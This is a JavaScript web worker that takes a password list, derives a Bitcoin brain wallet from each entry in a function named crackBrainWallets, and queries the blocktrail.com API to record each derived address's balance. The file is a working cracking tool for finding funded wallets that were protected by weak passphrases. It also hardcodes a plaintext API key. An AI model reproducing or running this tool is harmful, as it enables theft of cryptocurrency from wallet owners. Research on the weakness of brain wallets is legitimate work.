var window = self; // Because fuck importScripts
importScripts("brainwallet.js","bitcoinjs-min.js", "rfc1751.js", "mnemonic.js", "bitcoinsig.js", "secure-random.js")

//Import JQuery they said, it will work great they said, fuck everything (also, sync ajax)
function getJSON(url, callback) {
  var xhr;

  if(typeof XMLHttpRequest !== 'undefined') xhr = new XMLHttpRequest();
  else {
    var versions = ["MSXML2.XmlHttp.5.0", 
        "MSXML2.XmlHttp.4.0",
        "MSXML2.XmlHttp.3.0", 
        "MSXML2.XmlHttp.2.0",
        "Microsoft.XmlHttp"]

    for(var i = 0, len = versions.length; i < len; i++) {
    try {
      xhr = new ActiveXObject(versions[i]);
      break;
    }
      catch(e){}
    } // end for
  }
    
  xhr.open('GET', url, false);
  xhr.send('');
  return xhr.responseText
}

function crackBrainWallets(data){
  var finalized_data = [];
  var one_tenth = parseInt(data.length/10);
  data.forEach(function (password, i) {
    finalized_data.push(generateBrainWalletFromHash(password));
    if (i % one_tenth == 0){
      console.log("Status: " + i + " cracked (" + ((i/data.length)*100).toFixed(2) + "%)");
    }
  });
  return finalized_data;
}

function balanceCheck(data){
  var finalized_data = data;
  var one_tenth = parseInt(data.length/10);
  finalized_data.forEach(function (single_data, i) {
    var returns = getJSON("https://api.blocktrail.com/v1/btc/address/"+ single_data.result.pub +"?api_key=b00ec80b08c84ed346363bfa733b820c5b47e0b1")
    returns = JSON.parse(returns);

    finalized_data[i]["balance"] = returns.balance;
    finalized_data[i]["received"] = returns.received;

    if (i % one_tenth == 0){
      console.log("Status: " + i + " balance checked (" + ((i/finalized_data.length)*100).toFixed(2) + "%)");
    }
    if (i == finalized_data.length - 1)
    {
      //Wait until we have all the data.
      console.log("Completed balance checks");
      postMessage(finalized_data);
    }
  });
}

onmessage = function(e) {
  console.log("Beginning cracking attempts - Found " + e.data[0].length + " targets");
  var password_list = e.data[0]
  var finalized_wallets = crackBrainWallets(password_list);
  console.log("Completed cracking data");
  console.log("Attempting balance checks");
  balanceCheck(finalized_wallets);
}